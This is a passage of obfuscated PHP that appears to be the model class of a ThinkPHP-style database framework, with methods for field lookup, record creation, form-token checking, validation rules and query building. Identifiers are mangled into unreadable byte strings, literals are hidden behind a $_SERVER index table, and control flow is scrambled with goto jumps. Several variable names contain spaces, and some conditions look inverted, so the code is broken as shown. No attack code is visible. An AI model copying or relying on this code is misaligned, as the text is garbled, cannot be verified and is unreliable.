$Dõ¢…ŞÁ‡ = $b´›ö»“ëÈ; } else { $Dõ¢…ŞÁ‡[$b´›ö»“ëÈ] = $bî•öÆ²ÒÈ; } return $this->save($Dõ¢…ŞÁ‡); } public function setAdd($B·Ê’¸Øº–, $A¼âÜŒêô = 1) { $bø†’¹º =& $_SERVER[Šº]; $F‹‘ŒÀÏºå = $B·Ê’¸Øº– . $bø†’¹º[293] . $A¼âÜŒêô; if ($A¼âÜŒêô < 0) { $F‹‘ŒÀÏºå = $B·Ê’¸Øº– . $A¼âÜŒêô; } return $this->setField($B·Ê’¸Øº–, array($bø†’¹º[294], $F‹‘ŒÀÏºå)); } public function getField($BéïØ¸¯á, $b®äÛÊšÜé = null) { $a“†Ê¹‹Õ» =& $_SERVER[Šº]; $f×¡¨ãƒÈ[$a“†Ê¹‹Õ»[270]] = $BéïØ¸¯á; $f×¡¨ãƒÈ = $this->_parseOptions($f×¡¨ãƒÈ); $BéïØ¸¯á = trim($BéïØ¸¯á); if (strpos($BéïØ¸¯á, $a“†Ê¹‹Õ»[47])) { if (!isset($f×¡¨ãƒÈ[$a“†Ê¹‹Õ»[289]])) { $f×¡¨ãƒÈ[$a“†Ê¹‹Õ»[289]] = is_numeric($b®äÛÊšÜé) ? $b®äÛÊšÜé : $a“†Ê¹‹Õ»[33]; } $a¯›÷˜†± = $this->db->select($f×¡¨ãƒÈ); if (!empty($a¯›÷˜†±)) { goto Fª•ùàôµ¾; AÄ²ê³ÍÛ: foreach ($a¯›÷˜†± as $EãéíÚâ) { $E„ÛÎ×²‘ = $EãéíÚâ[$Dƒ•¤”¹½]; if (2 == $EÂ ËäÉÆ) { $fÇÁŠµÙÜá[$E„ÛÎ×²‘] = $EãéíÚâ[$B’‰†‚¾¡‡]; } else { $fÇÁŠµÙÜá[$E„ÛÎ×²‘] = is_string($b®äÛÊšÜé) ? implode($b®äÛÊšÜé, $EãéíÚâ) : $EãéíÚâ; } } return $fÇÁŠµÙÜá; goto c×ôâ¡‹Ë§; eùÍø¹„: $B’‰†‚¾¡‡ = array_shift($BéïØ¸¯á); $fÇÁŠµÙÜá = array(); $EÂ ËäÉÆ = count($a‡ÙŠÑ”ä¶); goto AÄ²ê³ÍÛ; Fª•ùàôµ¾: $a‡ÙŠÑ”ä¶ = explode($a“†Ê¹‹Õ»[47], $BéïØ¸¯á); $BéïØ¸¯á = array_keys($a¯›÷˜†±[0]); $Dƒ•¤”¹½ = array_shift($BéïØ¸¯á); goto eùÍø¹„; c×ôâ¡‹Ë§: } } else { if (!0 !== $b®äÛÊšÜé) { $f×¡¨ãƒÈ[$a“†Ê¹‹Õ»[289]] = is_numeric($b®äÛÊšÜé) ? $b®äÛÊšÜé : 1; } if ($b®äÛÊšÜé === $a“†Ê¹‹Õ»[252]) { unset($f×¡¨ãƒÈ[$a“†Ê¹‹Õ»[289]]); } $EãéíÚâ = $this->db->select($f×¡¨ãƒÈ); if (!empty($EãéíÚâ)) { if ($b®äÛÊšÜé === $a“†Ê¹‹Õ»[252]) { return reset($EãéíÚâ[0]); } if (!0 !== $b®äÛÊšÜé && 1 == $f×¡¨ãƒÈ[$a“†Ê¹‹Õ»[289]]) { return reset($EãéíÚâ[0]); } foreach ($EãéíÚâ as $aÈ†îİØí) { $c«Æ‰•ğÇ[] = $aÈ†îİØí[$BéïØ¸¯á]; } return $c«Æ‰•ğÇ; } } return null; } public function create($f¥„¾Íˆ = '', $DòÇ›ñ¼ = '') { goto A¯áÕÖ»Ê; A¯áÕÖ»Ê: $BÀöšø½¹» =& $_SERVER[Šº]; if (empty($f¥„¾Íˆ)) { $f¥„¾Íˆ = $_POST; } elseif (is_object($f¥„¾Íˆ)) { $f¥„¾Íˆ = get_object_vars($f¥„¾Íˆ); } if (empty($f¥„¾Íˆ) || !is_array($f¥„¾Íˆ)) { $this->error = think_lang($BÀöšø½¹»[268]); return !1; } goto d·„Äç®›Ú; d·„Äç®›Ú: $f¥„¾Íˆ = $this->parseFieldsMap($f¥„¾Íˆ, 0); $DòÇ›ñ¼ = $DòÇ›ñ¼ ? $DòÇ›ñ¼ : (!empty($f¥„¾Íˆ[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$BÀöšø½¹»[270]])) { $E¥÷Í°Š ø = $this->options[$BÀöšø½¹»[270]]; unset($this->options[$BÀöšø½¹»[270]]); } elseif ($DòÇ›ñ¼ == THINK_MODEL_INSERT && isset($this->insertFields)) { $E¥÷Í°Š ø = $this->insertFields; } elseif ($DòÇ›ñ¼ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $E¥÷Í°Š ø = $this->updateFields; } goto Aº«Œ”°‘Ò; CİáíË®‰ì: return $f¥„¾Íˆ; goto F“ˆ¾ù¡µ ; Aº«Œ”°‘Ò: if (isset($E¥÷Í°Š ø)) { if (is_string($E¥÷Í°Š ø)) { $E¥÷Í°Š ø = explode($BÀöšø½¹»[47], $E¥÷Í°Š ø); } if (think_config($BÀöšø½¹»[295])) { $E¥÷Í°Š ø[] = think_config($BÀöšø½¹»[296]); } foreach ($f¥„¾Íˆ as $fùáÃ‚¦×¬ => $e¤Ãö‚ÇÊÅ) { if (!in_array($fùáÃ‚¦×¬, $E¥÷Í°Š ø)) { unset($f¥„¾Íˆ[$fùáÃ‚¦×¬]); } } } if (!$this->autoValidation($f¥„¾Íˆ, $DòÇ›ñ¼)) { return !1; } if (!$this->autoCheckToken($f¥„¾Íˆ)) { $this->error = think_lang($BÀöšø½¹»[297]); return !1; } goto c—”°îÚŠ; c—”°îÚŠ: if ($this->autoCheckFields) { $E¥÷Í°Š ø = $this->getDbFields(); foreach ($f¥„¾Íˆ as $fùáÃ‚¦×¬ => $e¤Ãö‚ÇÊÅ) { if (!in_array($fùáÃ‚¦×¬, $E¥÷Í°Š ø)) { unset($f¥„¾Íˆ[$fùáÃ‚¦×¬]); } elseif (MAGIC_QUOTES_GPC && is_string($e¤Ãö‚ÇÊÅ)) { $f¥„¾Íˆ[$fùáÃ‚¦×¬] = stripslashes($e¤Ãö‚ÇÊÅ); } } } $this->autoOperation($f¥„¾Íˆ, $DòÇ›ñ¼); $this->data = $f¥„¾Íˆ; goto CİáíË®‰ì; F“ˆ¾ù¡µ : } public function autoCheckToken($e íƒñÀ¡Ê) { $c¤ƒ·ßµ°è =& $_SERVER[Šº]; if (isset($this->options[$c¤ƒ·ßµ°è[298]]) && !$this->options[$c¤ƒ·ßµ°è[298]]) { return !0; } if (think_config($c¤ƒ·ßµ°è[295])) { $E…£ŒéËé¸ = think_config($c¤ƒ·ßµ°è[296]); if (!isset($e íƒñÀ¡Ê[$E…£ŒéËé¸]) || Session::get($E…£ŒéËé¸)) { return !1; } list($c©ïªØâ÷Œ, $BÆ’Ï¶ÃÜÃ) = explode($c¤ƒ·ßµ°è[71], $e íƒñÀ¡Ê[$E…£ŒéËé¸]); if ($BÆ’Ï¶ÃÜÃ && Session::get($E…£ŒéËé¸ . $c¤ƒ·ßµ°è[95] . $c©ïªØâ÷Œ) === $BÆ’Ï¶ÃÜÃ) { Session::remove($E…£ŒéËé¸ . $c¤ƒ·ßµ°è[95] . $c©ïªØâ÷Œ); return !0; } if (think_config($c¤ƒ·ßµ°è[299])) { Session::remove($E…£ŒéËé¸ . $c¤ƒ·ßµ°è[95] . $c©ïªØâ÷Œ); } return !1; } return !0; } public function regex($EæŠ§©·­«, $e¥³Òì¿²‰) { $d‰–Ô†Åİã =& $_SERVER[Šº]; $b­õÇ¸îà‘ = array($d‰–Ô†Åİã[300] => $d‰–Ô†Åİã[301], $d‰–Ô†Åİã[302] => $d‰–Ô†Åİã[303], $d‰–Ô†Åİã[304] => $d‰–Ô†Åİã[305], $d‰–Ô†Åİã[306] => $d‰–Ô†Åİã[307], $d‰–Ô†Åİã[308] => $d‰–Ô†Åİã[309], $d‰–Ô†Åİã[310] => $d‰–Ô†Åİã[311], $d‰–Ô†Åİã[312] => $d‰–Ô†Åİã[313], $d‰–Ô†Åİã[287] => $d‰–Ô†Åİã[314], $d‰–Ô†Åİã[315] => $d‰–Ô†Åİã[316]); if (isset($b­õÇ¸îà‘[strtolower($e¥³Òì¿²‰)])) { $e¥³Òì¿²‰ = $b­õÇ¸îà‘[strtolower($e¥³Òì¿²‰)]; } return preg_match($e¥³Òì¿²‰, $EæŠ§©·­«) === 1; } private function autoOperation(&$Aàï’áó×ñ, $cÎÈÃÚÍÇº) { $AåØñïÃë† =& $_SERVER[Šº]; if (!empty($this->options[$AåØñïÃë†[317]])) { $BÉ´îßÕƒù = $this->options[$AåØñïÃë†[317]]; unset($this->options[$AåØñïÃë†[317]]); } elseif (!empty($this->_auto)) { $BÉ´îßÕƒù = $this->_auto; } if (isset($BÉ´îßÕƒù)) { foreach ($BÉ´îßÕƒù as $e§–¶ÜÒÑ) { if (empty($e§–¶ÜÒÑ[2])) { $e§–¶ÜÒÑ[2] = THINK_MODEL_INSERT; } if ($cÎÈÃÚÍÇº == $e§–¶ÜÒÑ[2] || $e§–¶ÜÒÑ[2] == THINK_MODEL_BOTH) { switch (trim($e§–¶ÜÒÑ[3])) { case $AåØñïÃë†[318]: case $AåØñïÃë†[319]: $ağøáˆ¼â = isset($e§–¶ÜÒÑ[4]) ? (array) $e§–¶ÜÒÑ[4] : array(); if (isset($Aàï’áó×ñ[$e§–¶ÜÒÑ[0]])) { array_unshift($ağøáˆ¼â, $Aàï’áó×ñ[$e§–¶ÜÒÑ[0]]); } if ($AåØñïÃë†[318] == $e§–¶ÜÒÑ[3]) { $Aàï’áó×ñ[$e§–¶ÜÒÑ[0]] = call_user_func_array($e§–¶ÜÒÑ[1], $ağøáˆ¼â); } else { $Aàï’áó×ñ[$e§–¶ÜÒÑ[0]] = call_user_func_array(array(&$this, $e§–¶ÜÒÑ[1]), $ağøáˆ¼â); } break; case $AåØñïÃë†[270]: $Aàï’áó×ñ[$e§–¶ÜÒÑ[0]] = $Aàï’áó×ñ[$e§–¶ÜÒÑ[1]]; break; case $AåØñïÃë†[320]: if ($AåØñïÃë†[33] === $Aàï’áó×ñ[$e§–¶ÜÒÑ[0]]) { unset($Aàï’áó×ñ[$e§–¶ÜÒÑ[0]]); } break; case $AåØñïÃë†[321]: default: $Aàï’áó×ñ[$e§–¶ÜÒÑ[0]] = $e§–¶ÜÒÑ[1]; } if (!1 === $Aàï’áó×ñ[$e§–¶ÜÒÑ[0]]) { unset($Aàï’áó×ñ[$e§–¶ÜÒÑ[0]]); } } } } return $Aàï’áó×ñ; } protected function autoValidation($A‰¯÷¶Ëß, $FœŸÇ†äÇ) { $FÀñÒ”¤­ =& $_SERVER[Šº]; if (!empty($this->options[$FÀñÒ”¤­[322]])) { $fô—µ’«ÛĞ = $this->options[$FÀñÒ”¤­[322]]; unset($this->options[$FÀñÒ”¤­[322]]); } elseif (!empty($this->_validate)) { $fô—µ’«ÛĞ = $this->_validate; } if (isset($fô—µ’«ÛĞ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($fô—µ’«ÛĞ as $FÉÎÍËô›³ => $B½ù‡¹») { if (empty($B½ù‡¹»[5]) || $B½ù‡¹»[5] == THINK_MODEL_BOTH || $B½ù‡¹»[5] == $FœŸÇ†äÇ) { if (0 == strpos($B½ù‡¹»[2], $FÀñÒ”¤­[323]) && strpos($B½ù‡¹»[2], $FÀñÒ”¤­[324])) { $B½ù‡¹»[2] = think_lang(substr($B½ù‡¹»[2], 2, -1)); } $B½ù‡¹»[3] = isset($B½ù‡¹»[3]) ? $B½ù‡¹»[3] : THINK_EXISTS_VALIDATE; $B½ù‡¹»[4] = isset($B½ù‡¹»[4]) ? $B½ù‡¹»[4] : $FÀñÒ”¤­[325]; switch ($B½ù‡¹»[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($A‰¯÷¶Ëß, $B½ù‡¹»)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($FÀñÒ”¤­[33] != trim($A‰¯÷¶Ëß[$B½ù‡¹»[0]])) { if (!1 === $this->_validationField($A‰¯÷¶Ëß, $B½ù‡¹»)) { return !1; } } break; default: if (isset($A‰¯÷¶Ëß[$B½ù‡¹»[0]])) { if (!1 === $this->_validationField($A‰¯÷¶Ëß, $B½ù‡¹»)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($cÚ»§Úæó, $eÈÅé£ß÷Ğ) { if (!1 === $this->_validationFieldItem($cÚ»§Úæó, $eÈÅé£ß÷Ğ)) { if ($this->patchValidate) { $this->error[$eÈÅé£ß÷Ğ[0]] = $eÈÅé£ß÷Ğ[2]; } else { $this->error = $eÈÅé£ß÷Ğ[2]; return !1; } } return; } protected function _validationFieldItem($Cšø¢ÉƒØš, $b½ºÅÃÃ™) { $aÒ¾©À‚ÙÎ =& $_SERVER[Šº]; switch (strtolower(trim($b½ºÅÃÃ™[4]))) { case $aÒ¾©À‚ÙÎ[318]: case $aÒ¾©À‚ÙÎ[319]: $bÊì·¹Şô‘ = isset($b½ºÅÃÃ™[6]) ? (array) $b½ºÅÃÃ™[6] : array(); if (is_string($b½ºÅÃÃ™[0]) && strpos($b½ºÅÃÃ™[0], $aÒ¾©À‚ÙÎ[47])) { $b½ºÅÃÃ™[0] = explode($aÒ¾©À‚ÙÎ[47], $b½ºÅÃÃ™[0]); } if (is_array($b½ºÅÃÃ™[0])) { foreach ($b½ºÅÃÃ™[0] as $f©Ô¤í§ôó) { $B¾ìÃŸ†İó[$f©Ô¤í§ôó] = $Cšø¢ÉƒØš[$f©Ô¤í§ôó]; } array_unshift($bÊì·¹Şô‘, $B¾ìÃŸ†İó); } else { array_unshift($bÊì·¹Şô‘, $Cšø¢ÉƒØš[$b½ºÅÃÃ™[0]]); } if ($aÒ¾©À‚ÙÎ[318] == $b½ºÅÃÃ™[4]) { return call_user_func_array($b½ºÅÃÃ™[1], $bÊì·¹Şô‘); } else { return call_user_func_array(array(&$this, $b½ºÅÃÃ™[1]), $bÊì·¹Şô‘); } case $aÒ¾©À‚ÙÎ[326]: return $Cšø¢ÉƒØš[$b½ºÅÃÃ™[0]] == $Cšø¢ÉƒØš[$b½ºÅÃÃ™[1]]; case $aÒ¾©À‚ÙÎ[327]: if (is_string($b½ºÅÃÃ™[0]) && strpos($b½ºÅÃÃ™[0], $aÒ¾©À‚ÙÎ[47])) { $b½ºÅÃÃ™[0] = explode($aÒ¾©À‚ÙÎ[47], $b½ºÅÃÃ™[0]); } $DÍ¿·‚Ø®¡ = array(); if (is_array($b½ºÅÃÃ™[0])) { foreach ($b½ºÅÃÃ™[0] as $f©Ô¤í§ôó) { $DÍ¿·‚Ø®¡[$f©Ô¤í§ôó] = $Cšø¢ÉƒØš[$f©Ô¤í§ôó]; } } else { $DÍ¿·‚Ø®¡[$b½ºÅÃÃ™[0]] = $Cšø¢ÉƒØš[$b½ºÅÃÃ™[0]]; } if (!empty($Cšø¢ÉƒØš[$this->getPk()])) { $DÍ¿·‚Ø®¡[$this->getPk()] = array($aÒ¾©À‚ÙÎ[328], $Cšø¢ÉƒØš[$this->getPk()]); } if ($this->where($DÍ¿·‚Ø®¡)->find()) { return !1; } return !0; default: return $this->check($Cšø¢ÉƒØš[$b½ºÅÃÃ™[0]], $b½ºÅÃÃ™[1], $b½ºÅÃÃ™[4]); } } public function check($D İÌ¬®†¸, $a¯ÇèÒ¿ùŞ, $CàØªºŞ® = "\x72\x65\147\145\170") { $a‹‰‚â¶º´ =& $_SERVER[Šº]; $CàØªºŞ® = strtolower(trim($CàØªºŞ®)); switch ($CàØªºŞ®) { case $a‹‰‚â¶º´[7]: case $a‹‰‚â¶º´[329]: $e¹Ó²œÇ†Ø = is_array($a¯ÇèÒ¿ùŞ) ? $a¯ÇèÒ¿ùŞ : explode($a‹‰‚â¶º´[47], $a¯ÇèÒ¿ùŞ); return $CàØªºŞ® == $a‹‰‚â¶º´[7] ? in_array($D İÌ¬®†¸, $e¹Ó²œÇ†Ø) : !in_array($D İÌ¬®†¸, $e¹Ó²œÇ†Ø); case $a‹‰‚â¶º´[330]: case $a‹‰‚â¶º´[331]: if (is_array($a¯ÇèÒ¿ùŞ)) { $C‡‘ÌéæÈÇ = $a¯ÇèÒ¿ùŞ[0]; $a½¤éè‡± = $a¯ÇèÒ¿ùŞ[1]; } else { list($C‡‘ÌéæÈÇ, $a½¤éè‡±) = explode($a‹‰‚â¶º´[47], $a¯ÇèÒ¿ùŞ); } return $CàØªºŞ® == $a‹‰‚â¶º´[330] ? $D İÌ¬®†¸ >= $C‡‘ÌéæÈÇ && $D İÌ¬®†¸ <= $a½¤éè‡± : $D İÌ¬®†¸ < $C‡‘ÌéæÈÇ || $D İÌ¬®†¸ > $a½¤éè‡±; case $a‹‰‚â¶º´[332]: case $a‹‰‚â¶º´[333]: return $CàØªºŞ® == $a‹‰‚â¶º´[332] ? $D İÌ¬®†¸ == $a¯ÇèÒ¿ùŞ : $D İÌ¬®†¸ != $a¯ÇèÒ¿ùŞ; case $a‹‰‚â¶º´[334]: $Ağ™‡µ£Ş‡ = mb_strlen($D İÌ¬®†¸, $a‹‰‚â¶º´[335]); if (strpos($a¯ÇèÒ¿ùŞ, $a‹‰‚â¶º´[47])) { list($C‡‘ÌéæÈÇ, $a½¤éè‡±) = explode($a‹‰‚â¶º´[47], $a¯ÇèÒ¿ùŞ); return $Ağ™‡µ£Ş‡ >= $C‡‘ÌéæÈÇ && $Ağ™‡µ£Ş‡ <= $a½¤éè‡±; } else { return $Ağ™‡µ£Ş‡ == $a¯ÇèÒ¿ùŞ; } case $a‹‰‚â¶º´[336]: list($a¯ŸŞÉÌÛÚ, $D••†ªÒÜ¶) = explode($a‹‰‚â¶º´[47], $a¯ÇèÒ¿ùŞ); if (!is_numeric($a¯ŸŞÉÌÛÚ)) { $a¯ŸŞÉÌÛÚ = strtotime($a¯ŸŞÉÌÛÚ); } if (!is_numeric($D••†ªÒÜ¶)) { $D••†ªÒÜ¶ = strtotime($D••†ªÒÜ¶); } return NOW_TIME >= $a¯ŸŞÉÌÛÚ && NOW_TIME <= $D••†ªÒÜ¶; case $a‹‰‚â¶º´[337]: return in_array(get_client_ip(), explode($a‹‰‚â¶º´[47], $a¯ÇèÒ¿ùŞ)); case $a‹‰‚â¶º´[338]: return !in_array(get_client_ip(), explode($a‹‰‚â¶º´[47], $a¯ÇèÒ¿ùŞ)); case $a‹‰‚â¶º´[325]: default: return $this->regex($D İÌ¬®†¸, $a¯ÇèÒ¿ùŞ); } } public function query($DÆÀôóà, $D¦ßË»¹¸ = false) { $aÍ‘—’§ÉŠ =& $_SERVER[Šº]; if (!is_bool($D¦ßË»¹¸) && !is_array($D¦ßË»¹¸)) { $D¦ßË»¹¸ = func_get_args(); array_shift($D¦ßË»¹¸); } $DÆÀôóà = str_replace(array($aÍ‘—’§ÉŠ[228], $aÍ‘—’§ÉŠ[339]), $aÍ‘—’§ÉŠ[50], $DÆÀôóà); $DÆÀôóà = $this->parseSql($DÆÀôóà, $D¦ßË»¹¸); return $this->db->query($DÆÀôóà); } public function execute($aØØ…ÅÅµ, $a’‰¨â’ôš = false) { if (!is_bool($a’‰¨â’ôš) && !is_array($a’‰¨â’ôš)) { $a’‰¨â’ôš = func_get_args(); array_shift($a’‰¨â’ôš); } $aØØ…ÅÅµ = $this->parseSql($aØØ…ÅÅµ, $a’‰¨â’ôš); return $this->db->execute($aØØ…ÅÅµ); } protected function parseSql($CšÉùõ³§÷, $E˜‘¤‚õŞñ) { $A‚Ù÷ô¨Æ° =& $_SERVER[Šº]; if (!0 === $E˜‘¤‚õŞñ) { $FŒ¬ªÍòèŒ = $this->_parseOptions(); $CšÉùõ³§÷ = $this->db->parseSql($CšÉùõ³§÷, $FŒ¬ªÍòèŒ); } elseif (is_array($E˜‘¤‚õŞñ)) { $E˜‘¤‚õŞñ = array_map(array($this->db, $A‚Ù÷ô¨Æ°[340]), $E˜‘¤‚õŞñ); $CšÉùõ³§÷ = vsprintf($CšÉùõ³§÷, $E˜‘¤‚õŞñ); } else { $CšÉùõ³§÷ = strtr($CšÉùõ³§÷, array($A‚Ù÷ô¨Æ°[341] => $this->getTableName(), $A‚Ù÷ô¨Æ°[342] => think_config($A‚Ù÷ô¨Æ°[241]))); } $this->db->setModel($this->name); return $CšÉùõ³§÷; } public function db($A¢ÇÒª£§Ã = '', $Cà­£¿ºÑ = '', $bƒŠ ØÍ« = array()) { goto A®Ó Šƒ; EÄ«¼ÎùÍÚ: $E”†ŞÏ »µ[$A¢ÇÒª£§Ã] = $Cà­£¿ºÑ; $this->db = $B™·ÅˆÁ[$A¢ÇÒª£§Ã]; $this->_after_db(); goto FóªìÃÕÇ‰; d’Œ‚µ³×¶: static $B™·ÅˆÁ = array(); if (!isset($B™·ÅˆÁ[$A¢ÇÒª£§Ã]) || isset($B™·ÅˆÁ[$A¢ÇÒª£§Ã]) && $Cà­£¿ºÑ && $E”†ŞÏ »µ[$A¢ÇÒª£§Ã] != $Cà­£¿ºÑ) { if (!empty($Cà­£¿ºÑ) && is_string($Cà­£¿ºÑ) && !1 === strpos($Cà­£¿ºÑ, $f¥´Â¨É™ƒ[8])) { $Cà­£¿ºÑ = think_config($Cà­£¿ºÑ); } $B™·ÅˆÁ[$A¢ÇÒª£§Ã] = Db::getInstance($Cà­£¿ºÑ); } elseif (NULL === $Cà­£¿ºÑ) { $B™·ÅˆÁ[$A¢ÇÒª£§Ã]->close(); unset($B™·ÅˆÁ[$A¢ÇÒª£§Ã]); return; } if (!empty($bƒŠ ØÍ«)) { if (is_string($bƒŠ ØÍ«)) { parse_str($bƒŠ ØÍ«, $bƒŠ ØÍ«); } foreach ($bƒŠ ØÍ« as $f¯“šÎÊªˆ => $A™¹ŠŒµß) { $this->setProperty($f¯“šÎÊªˆ, $A™¹ŠŒµß); } } goto EÄ«¼ÎùÍÚ; FóªìÃÕÇ‰: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto e©÷•ğ”õ; A®Ó Šƒ: $f¥´Â¨É™ƒ =& $_SERVER[Šº]; if ($f¥´Â¨É™ƒ[33] === $A¢ÇÒª£§Ã && $this->db) { return $this->db; } static $E”†ŞÏ »µ = array(); goto d’Œ‚µ³×¶; e©÷•ğ”õ: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $d£©»¿¡ìµ = get_class($this); if ($d£©»¿¡ìµ == $_SERVER[Šº][343]) { return $this->name; } $this->name = substr($d£©»¿¡ìµ, 0, -5); } return $this->name; } public function getTableName() { $B‹³‡‰Ë¢ß =& $_SERVER[Šº]; if (empty($this->trueTableName)) { $A¦œ¥™óß… = !empty($this->tablePrefix) ? $this->tablePrefix : $B‹³‡‰Ë¢ß[33]; if (!empty($this->tableName)) { $A¦œ¥™óß… .= $this->tableName; } else { $A¦œ¥™óß… .= think_parse_name($this->name); } $this->trueTableName = strtolower($A¦œ¥™óß…); } return (!empty($this->dbName) ? $this->dbName . $B‹³‡‰Ë¢ß[95] : $B‹³‡‰Ë¢ß[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $Cö¸ÉÉåÈ =& $_SERVER[Šº]; return isset($this->fields[$Cö¸ÉÉåÈ[248]]) ? $this->fields[$Cö¸ÉÉåÈ[248]] : $this->pk; } public function getDbFields() { $c±°éÌ¿Ó¦ =& $_SERVER[Šº]; if (isset($this->options[$c±°éÌ¿Ó¦[276]])) { $D©é©‚º­„ = $this->db->getFields($this->options[$c±°éÌ¿Ó¦[276]]); return $D©é©‚º­„ ? array_keys($D©é©‚º­„) : !1; } if ($this->fields) { $D©é©‚º­„ = $this->fields; unset($D©é©‚º­„[$c±°éÌ¿Ó¦[247]], $D©é©‚º­„[$c±°éÌ¿Ó¦[248]], $D©é©‚º­„[$c±°éÌ¿Ó¦[249]], $D©é©‚º­„[$c±°éÌ¿Ó¦[246]]); return $D©é©‚º­„; } return !1; } public function data($E—”ìƒŸ¿é = '') { $aÆ‰â‡çù© =& $_SERVER[Šº]; if ($aÆ‰â‡çù©[33] === $E—”ìƒŸ¿é && !empty($this->data)) { return $this->data; } if (is_object($E—”ìƒŸ¿é)) { $E—”ìƒŸ¿é = get_object_vars($E—”ìƒŸ¿é); } elseif (is_string($E—”ìƒŸ¿é)) { parse_str($E—”ìƒŸ¿é, $E—”ìƒŸ¿é); } elseif (!is_array($E—”ìƒŸ¿é)) { think_exception(think_lang($aÆ‰â‡çù©[268])); } $this->data = $E—”ìƒŸ¿é; return $this; } public function join($fÖ„ †Ô‡) { $eµßïÌŠõ¬ =& $_SERVER[Šº]; if (is_array($fÖ„ †Ô‡)) { $this->options[$eµßïÌŠõ¬[279]] = $fÖ„ †Ô‡; } elseif (!empty($fÖ„ †Ô‡)) { $this->options[$eµßïÌŠõ¬[279]][] = $fÖ„ †Ô‡; } return $this; } public function union($aøªç¹»øù, $BÖš•‘ˆÛã = false) { goto Aº“¼¹Å•Õ; a­à¼Š±Õˆ: return $this; goto f±ùïê§; Aº“¼¹Å•Õ: $Aî©˜Å·ïÌ =& $_SERVER[Šº]; if (empty($aøªç¹»øù)) { return $this; } if ($BÖš•‘ˆÛã) { $this->options[$Aî©˜Å·ïÌ[344]][$Aî©˜Å·ïÌ[345]] = !0; } goto F³…äöÌ·; F³…äöÌ·: if (is_object($aøªç¹»øù)) { $aøªç¹»øù = get_object_vars($aøªç¹»øù); } if (is_string($aøªç¹»øù)) { $Bù¢ËÈíéÌ = $aøªç¹»øù; } elseif (is_array($aøªç¹»øù)) { if (isset($aøªç¹»øù[0])) { $this->options[$Aî©˜Å·ïÌ[344]] = array_merge($this->options[$Aî©˜Å·ïÌ[344]], $aøªç¹»øù); return $this; } else { $Bù¢ËÈíéÌ = $aøªç¹»øù; } } else { think_exception(think_lang($Aî©˜Å·ïÌ[268])); } $this->options[$Aî©˜Å·ïÌ[344]][] = $Bù¢ËÈíéÌ; goto a­à¼Š±Õˆ; f±ùïê§: } public function cache($f¾àå´‡Ö‡ = true, $BÄÚì¯ÔØ† = null, $BÇ¬½“ááà = '') { $f£â¤Šùô =& $_SERVER[Šº]; if (!1 !== $f¾àå´‡Ö‡) { $this->options[$f£â¤Šùô[346]] = array($f£â¤Šùô[93] => $f¾àå´‡Ö‡, $f£â¤Šùô[336] => $BÄÚì¯ÔØ†, $f£â¤Šùô[29] => $BÇ¬½“ááà); } return $this; } public function field($DÅ’ˆê¾é¡, $AŒŠî’¢ÌÊ = false) { $cìö±»–Àµ =& $_SERVER[Šº]; if (!0 === $DÅ’ˆê¾é¡) { $f¤Ù¤åöæ = $this->getDbFields(); $DÅ’ˆê¾é¡ = $f¤Ù¤åöæ ? $f¤Ù¤åöæ : $cìö±»–Àµ[182]; } elseif ($AŒŠî’¢ÌÊ) { if (is_string($DÅ’ˆê¾é¡)) { $DÅ’ˆê¾é¡ = explode($cìö±»–Àµ[47], $DÅ’ˆê¾é¡); } $f¤Ù¤åöæ = $this->getDbFields(); $DÅ’ˆê¾é¡ = $f¤Ù¤åöæ ? array_diff($f¤Ù¤åöæ, $DÅ’ˆê¾é¡) : $DÅ’ˆê¾é¡; } $this->options[$cìö±»–Àµ[270]] = $DÅ’ˆê¾é¡; return $this; } public function scope($e¼¯èĞ™ê = '', $B ‚‹•›˜ = NULL) { $EÔ†Ÿ¹Á¯¶ =& $_SERVER[Šº]; if ($EÔ†Ÿ¹Á¯¶[33] === $e¼¯èĞ™ê) { if (isset($this->_scope[$EÔ†Ÿ¹Á¯¶[34]])) { $C†ÈÕ¹ò÷‘ = $this->_scope[$EÔ†Ÿ¹Á¯¶[34]]; } else { return $this; } } elseif (is_string($e¼¯èĞ™ê)) { $E¨™·¬¦¿ = explode($EÔ†Ÿ¹Á¯¶[47], $e¼¯èĞ™ê); $C†ÈÕ¹ò÷‘ = array(); foreach ($E¨™·¬¦¿ as $fÌœ„¬¾¯¾) { if (!isset($this->_scope[$fÌœ„¬¾¯¾])) { continue; } $C†ÈÕ¹ò÷‘ = array_merge($C†ÈÕ¹ò÷‘, $this->_scope[$fÌœ„¬¾¯¾]); } if (!empty($B ‚‹•›˜) && is_array($B ‚‹•›˜)) { $C†ÈÕ¹ò÷‘ = array_merge($C†ÈÕ¹ò÷‘, $B ‚‹•›˜); } } elseif (is_array($e¼¯èĞ™ê)) { $C†ÈÕ¹ò÷‘ = $e¼¯èĞ™ê; } if (is_array($C†ÈÕ¹ò÷‘) && !empty($C†ÈÕ¹ò÷‘)) { $this->options = array_merge($this->options, array_change_key_case($C†ÈÕ¹ò÷‘)); } return $this; } public function where($dâ¸¹±Ğ¿•, $CÀÁÈ¥”•Ÿ = null) { $F»İ¤Œ…•Ø =& $_SERVER[Šº]; if (!is_null($CÀÁÈ¥”•Ÿ) && is_string($dâ¸¹±Ğ¿•)) { if (!is_array($CÀÁÈ¥”•Ÿ)) { $CÀÁÈ¥”•Ÿ = func_get_args(); array_shift($CÀÁÈ¥”•Ÿ); } $CÀÁÈ¥”•Ÿ = array_map(array($this->db, $F»İ¤Œ…•Ø[340]), $CÀÁÈ¥”•Ÿ); $dâ¸¹±Ğ¿• = vsprintf($dâ¸¹±Ğ¿•, $CÀÁÈ¥”•Ÿ); } elseif (is_object($dâ¸¹±Ğ¿•)) { $dâ¸¹±Ğ¿• = get_object_vars($dâ¸¹±Ğ¿•); } elseif (is_array($dâ¸¹±Ğ¿•)) { foreach ($dâ¸¹±Ğ¿• as $fëù”ËËùË => 